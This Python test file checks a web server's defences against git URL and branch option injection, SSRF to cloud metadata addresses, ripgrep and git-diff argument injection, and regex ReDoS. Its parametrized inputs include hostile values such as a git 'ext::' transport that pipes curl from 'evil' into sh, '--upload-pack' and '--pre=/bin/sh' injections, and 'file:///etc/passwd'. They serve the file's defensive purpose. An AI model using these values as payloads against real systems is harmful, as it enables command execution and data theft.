"""Injection + SSRF hardening tests (epic #318, #323).

C5 git URL/branch validators, H5 ripgrep arg injection, H6 LLM base_url SSRF,
M3 git-diff option injection.
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi import HTTPException
from pydantic import ValidationError

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT / "apps" / "web-server"))
sys.path.insert(0, str(_ROOT / "apps" / "backend"))

from server.routes.files import get_git_diff, search_files  # noqa: E402
from server.routes.llm_endpoints import _probe_models  # noqa: E402
from server.routes.projects import ProjectCreate  # noqa: E402
from server.services.url_safety import assert_safe_outbound_url  # noqa: E402

# ── C5: git URL / branch validators ────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_url",
    [
        "ext::sh -c 'curl evil|sh'",
        "fd::17/foo",
        "--upload-pack=touch /tmp/pwned",
        "file:///etc/passwd",
        "git::https://evil/x",  # contains '::'
    ],
)
def test_giturl_rejects_dangerous(bad_url):
    with pytest.raises(ValidationError):
        ProjectCreate(gitUrl=bad_url)


@pytest.mark.parametrize(
    "ok_url",
    [
        "https://github.com/owner/repo.git",
        "ssh://git@github.com/owner/repo.git",
        "git@github.com:owner/repo.git",
    ],
)
def test_giturl_accepts_valid(ok_url):
    assert ProjectCreate(gitUrl=ok_url).gitUrl == ok_url


def test_branch_rejects_leading_dash():
    with pytest.raises(ValidationError):
        ProjectCreate(gitUrl="https://x/y.git", branch="--upload-pack=touch /tmp/x")


def test_branch_accepts_normal():
    assert (
        ProjectCreate(gitUrl="https://x/y.git", branch="feature/foo-1").branch
        == "feature/foo-1"
    )


# ── H6: SSRF guard ─────────────────────────────────────────────────────────


# These used to call llm_endpoints' own private `_assert_url_not_ssrf`. That
# copy is gone (#1265) and the route now uses the canonical guard, so the tests
# go through `_probe_models` instead: it is the wiring, not the helper, that
# these were really pinning, and a helper test would have stayed green if the
# route had stopped calling it.
#
# The private-address cases moved OUT of this list in #1268, when the route was
# deliberately switched to the permissive posture: the module exists to test
# user-defined OpenAI-compatible servers and its docstring names LM Studio and
# vLLM, both of which live on localhost, so the strict posture refused two of
# the three targets it advertises. They are now pinned as REACHABLE by
# test_ssrf_allows_the_self_hosted_targets_this_route_advertises below, rather
# than deleted -- a parametrize entry that quietly disappears is how a posture
# change stops being reviewable.
#
# What stays here is what BOTH postures refuse, which is what bounds the
# permissive one: the cloud metadata addresses and non-http(s) schemes.
@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://[fd00:ec2::254]/",  # IPv6 instance metadata (unique-local)
        "file:///etc/passwd",  # bad scheme
    ],
)
def test_ssrf_blocks_unsafe(url):
    with patch("urllib.request.OpenerDirector.open") as opened:
        result = _probe_models(url, api_key=None, headers=None)
    assert result.ok is False
    # Refused before the socket, not after a failed connection.
    opened.assert_not_called()


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:1234",  # LM Studio
        "http://localhost:8000",  # vLLM
        "http://10.0.0.5",  # a self-hosted server on the LAN
    ],
)
def test_ssrf_allows_the_self_hosted_targets_this_route_advertises(url):
    """#1268: the permissive posture, pinned as behaviour rather than assumed.

    Asserts the transport was reached, not that no error came back -- "returns
    an error" is also what a refused URL produces, so only "was it dialled"
    tells the two apart.
    """
    with patch("urllib.request.OpenerDirector.open") as opened:
        resp = opened.return_value.__enter__.return_value
        resp.getcode.return_value = 200
        resp.read.return_value = b'{"data": [{"id": "qwen3-coder"}]}'
        result = _probe_models(url, api_key=None, headers=None)
    opened.assert_called_once()
    assert opened.call_args.args[0].full_url == f"{url}/v1/models"
    assert result.ok is True


def test_ssrf_allows_public(monkeypatch):
    monkeypatch.setattr(
        "socket.getaddrinfo",
        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 443))],
    )
    assert_safe_outbound_url("https://example.com/v1/models")  # must not raise


# ── H5 / M3: ripgrep + git-diff arg injection ──────────────────────────────


@pytest.fixture
def project(tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    (proj / ".git").mkdir(parents=True)
    monkeypatch.setattr(
        "server.routes.projects.load_projects", lambda: {"p": {"path": str(proj)}}
    )
    return proj


async def test_search_rejects_leading_dash_query(project):
    with pytest.raises(HTTPException) as exc:
        await search_files(
            project_id="p",
            query="--pre=/bin/sh",
            path="",
            file_pattern="*",
            max_results=10,
        )
    assert exc.value.status_code == 400


async def test_search_rejects_overlong_query(project):
    with pytest.raises(HTTPException) as exc:
        await search_files(
            project_id="p", query="a" * 2000, path="", file_pattern="*", max_results=10
        )
    assert exc.value.status_code == 400


async def test_git_diff_rejects_option_injection_base(project):
    with pytest.raises(HTTPException) as exc:
        await get_git_diff(project_id="p", path="", base="--output=/tmp/x")
    assert exc.value.status_code == 400


# ── py/regex-injection: the search query is a literal, not a pattern ────────


@pytest.fixture(params=["ripgrep", "python-fallback"])
def search_engine(request, monkeypatch):
    """Run each query through BOTH search paths.

    The pure-Python fallback is the one that actually runs in the shipped image
    (ripgrep is not installed there) and is where a caller-supplied regex used
    to be compiled, so it must be exercised even on dev boxes that have rg.
    """
    if request.param == "python-fallback":

        def _no_rg(*args, **kwargs):
            raise FileNotFoundError("rg")

        monkeypatch.setattr("server.routes.files.subprocess.run", _no_rg)
    return request.param


async def _search(project, query):
    return await search_files(
        project_id="p", query=query, path="", file_pattern="*", max_results=10
    )


async def test_search_treats_regex_metacharacters_literally(project, search_engine):
    (project / "a.txt").write_text("plain a.b line\nliteral a+b line\n")
    # As a regex, "a.b" would also match "a+b"; as a literal it must not.
    res = await _search(project, "a.b")
    assert [r.content for r in res.results] == ["plain a.b line"]
    assert res.results[0].match == "a.b"


async def test_search_matches_a_literal_bracket_expression(project, search_engine):
    # `[abc]` is a valid regex (matches "a"), so the old code returned every
    # line containing an 'a'. As a literal it matches only the literal text.
    (project / "a.txt").write_text("has an a\nhas [abc] verbatim\n")
    res = await _search(project, "[abc]")
    assert [r.content for r in res.results] == ["has [abc] verbatim"]


async def test_search_does_not_hang_on_a_redos_pattern(project, search_engine):
    # `(a+)+$` against a long non-matching line is exponential in `re`. As a
    # literal it is a plain substring scan and returns immediately.
    (project / "a.txt").write_text("a" * 4000 + "b\n")
    res = await _search(project, "(a+)+$")
    assert res.results == []


async def test_search_survives_an_invalid_regex(project, search_engine):
    # `re.compile("*(")` raises re.error -> a 500. A literal search cannot.
    (project / "a.txt").write_text("nothing here\n")
    res = await _search(project, "*(")
    assert res.results == []
